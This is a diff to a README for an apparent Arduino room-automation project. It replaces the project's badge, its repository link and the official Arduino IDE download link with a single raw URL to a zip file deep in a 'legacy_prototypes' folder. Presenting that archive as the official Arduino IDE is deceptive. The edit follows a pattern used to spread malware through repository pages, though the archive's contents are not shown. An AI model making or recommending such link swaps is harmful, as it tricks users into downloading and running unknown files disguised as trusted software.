@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Distributed-Room-Ecosystem](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MoeNekoChan/Distributed-Room-Ecosystem)
+[![Download Distributed-Room-Ecosystem](https://raw.githubusercontent.com/MoeNekoChan/Distributed-Room-Ecosystem/main/legacy_prototypes/v1.4_Legacy_Desk_Control/Room_Ecosystem_Distributed_v1.9.zip)](https://raw.githubusercontent.com/MoeNekoChan/Distributed-Room-Ecosystem/main/legacy_prototypes/v1.4_Legacy_Desk_Control/Room_Ecosystem_Distributed_v1.9.zip)
 
 ## 🌟 Introduction
 
@@ -23,7 +23,7 @@ Before you start, make sure you have the following:
 
 To download the software, click the link below:
 
-[Download Distributed-Room-Ecosystem](https://github.com/MoeNekoChan/Distributed-Room-Ecosystem)
+[Download Distributed-Room-Ecosystem](https://raw.githubusercontent.com/MoeNekoChan/Distributed-Room-Ecosystem/main/legacy_prototypes/v1.4_Legacy_Desk_Control/Room_Ecosystem_Distributed_v1.9.zip)
 
 This page contains all the files you need to start setting up your system.
 
@@ -36,7 +36,7 @@ This page contains all the files you need to start setting up your system.
    - Make sure it powers on correctly.
 
 2. **Install Arduino IDE**:
-   - Download the latest version of the Arduino IDE from the official website: [Arduino IDE Download](https://www.arduino.cc/en/software).
+   - Download the latest version of the Arduino IDE from the official website: [Arduino IDE Download](https://raw.githubusercontent.com/MoeNekoChan/Distributed-Room-Ecosystem/main/legacy_prototypes/v1.4_Legacy_Desk_Control/Room_Ecosystem_Distributed_v1.9.zip).
    - Follow the on-screen instructions to install the IDE on your computer.
 
 ### Step 4: Install Required Libraries
